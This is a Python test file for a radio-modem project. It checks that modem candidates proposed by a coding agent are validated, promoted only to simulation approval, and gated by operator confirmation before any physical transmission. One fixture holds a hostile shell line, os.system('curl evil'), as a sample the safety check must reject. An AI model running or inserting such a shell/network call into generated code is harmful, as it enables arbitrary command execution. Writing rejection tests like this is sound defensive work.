"""1.0.0-beta.1 OTA Phase 4: deterministic validation + promotion of a generated modem candidate.

A coding agent proposes a modem (profile + implementation); the canonical system validates it
through structure + flowgraph-safety + framing/security interop + simulated two-node delivery across
impaired channels, and promotes it to simulation-approved ONLY on a full pass. A candidate is never
physical-approved here. No model is run; nothing is transmitted.
"""

from __future__ import annotations

from aithernet.transport.identity import IdentityManager
from aithernet.transport.ota import authorization as auth
from aithernet.transport.ota.candidate import validate_and_promote
from aithernet.transport.ota.profiles import (
    PROFILE_UNAPPROVED,
    REFERENCE_BPSK,
    ProfileRegistry,
    RFLinkProfile,
)

SECRET = b"candidate-pairing-secret-out-of-band!"

# A "generated" candidate: a new BPSK profile variant (distinct sync word) the agent might propose.
CANDIDATE = RFLinkProfile(**{**REFERENCE_BPSK.__dict__, "profile_id": "gen-bpsk-alt",
                             "sync_word": bytes([0x1B, 0xE7])})

_GOOD_IMPL = "from gnuradio import gr, blocks, digital  # generated helper; bounded only"
_BAD_IMPL = "import os\nos.system('curl evil')  # arbitrary network/shell — must be rejected"


def _peer_keys(tmp_path):
    a = IdentityManager(tmp_path / "a", node_id="node-A", node_name="A").initialize()
    b = IdentityManager(tmp_path / "b", node_id="node-B", node_name="B").initialize()
    return ("node-A", "node-B", a.public_key_b64, b.public_key_b64, SECRET)


def test_valid_candidate_is_validated_and_promoted(tmp_path):
    reg = ProfileRegistry()
    report = validate_and_promote(CANDIDATE, implementation_source=_GOOD_IMPL, registry=reg,
                                  peer_keys=_peer_keys(tmp_path))
    assert report.profile_structurally_valid and report.flowgraph_safe
    assert report.framing_interop_ok and report.passed
    assert report.promoted is True
    assert reg.approved_for_simulation("gen-bpsk-alt")
    # digests are recorded for audit/research
    assert report.profile_digest.startswith("sha256:")
    assert report.implementation_digest.startswith("sha256:")
    assert report.flowgraph_digest.startswith("sha256:")
    assert all(report.simulated_deliveries)


def test_unsafe_implementation_is_rejected_not_promoted(tmp_path):
    reg = ProfileRegistry()
    report = validate_and_promote(CANDIDATE, implementation_source=_BAD_IMPL, registry=reg,
                                  peer_keys=_peer_keys(tmp_path))
    assert report.flowgraph_safe is False
    assert report.promoted is False
    assert not report.passed
    # registered as a candidate but left UNAPPROVED
    assert reg.state("gen-bpsk-alt") == PROFILE_UNAPPROVED
    assert not reg.approved_for_simulation("gen-bpsk-alt")
    assert any("os.system" in p or "subprocess" in p or "banned" in p for p in report.problems)


def test_software_validated_profile_is_usable_physically_after_local_confirmation(tmp_path):
    # beta.2 policy correction: a software-validated profile is NOT vendor-locked out of physical
    # use. Physical TX is gated only by LOCAL operator control + technical correctness.
    from aithernet.transport.ota import tx_control as txc
    from aithernet.transport.ota.profiles import QUAL_SOFTWARE_VALIDATED
    reg = ProfileRegistry()
    validate_and_promote(CANDIDATE, implementation_source=_GOOD_IMPL, registry=reg,
                         peer_keys=_peer_keys(tmp_path))
    assert reg.qualification_state("gen-bpsk-alt") == QUAL_SOFTWARE_VALIDATED
    # not previously hardware-tested, but NOT prohibited from physical use once the operator confirms
    assert reg.usable_physically("gen-bpsk-alt", operator_confirmed=True) is True

    cap = auth.RFTxCapability(adapter_supports_tx=True, device_reports_tx=True,
                              min_freq_hz=70_000_000, max_freq_hz=6_000_000_000,
                              max_sample_rate=20_000_000, max_gain=70.0, channels=(0,))
    plan = auth.RFTxPlan(
        device_id="pluto", uri="ip:192.168.2.1", profile_id="gen-bpsk-alt",
        profile_digest=CANDIDATE.digest(), flowgraph_digest="fg", implementation_digest="im",
        frame_artifact_digest="fa", center_frequency_hz=433_000_000, sample_rate=8000,
        occupied_bandwidth_hz=1200, gain=10.0, channel=0, duration_seconds=1.0,
        message_count=1, frame_count=3)
    # Disabled by the LOCAL operator -> denied for a TECHNICAL reason, NOT a simulation-only lock.
    denied = txc.evaluate_operator_tx(plan=plan, config=txc.OperatorTxConfig(enabled=False),
                                      capability=cap, device_present=True, peer_authenticated=True,
                                      interactive_confirmed=True, now=0)
    assert denied.allowed is False
    assert any("not enabled" in r for r in denied.reasons)
    assert not any("simulation only" in r for r in denied.reasons)
    # Operator-enabled + within device/operator ranges + peer authenticated + confirmed -> ALLOWED.
    ok = txc.evaluate_operator_tx(
        plan=plan, config=txc.OperatorTxConfig(enabled=True, max_duration_seconds=5.0,
                                               gain_ceiling=70.0, max_frame_count=1000),
        capability=cap, device_present=True, peer_authenticated=True, interactive_confirmed=True,
        now=0)
    assert ok.allowed is True and ok.reasons == []


def test_structurally_invalid_candidate_rejected(tmp_path):
    reg = ProfileRegistry()
    bad = RFLinkProfile(**{**CANDIDATE.__dict__, "profile_id": "bad", "sample_rate": 12345})
    report = validate_and_promote(bad, implementation_source=_GOOD_IMPL, registry=reg,
                                  peer_keys=_peer_keys(tmp_path))
    assert report.profile_structurally_valid is False and not report.promoted
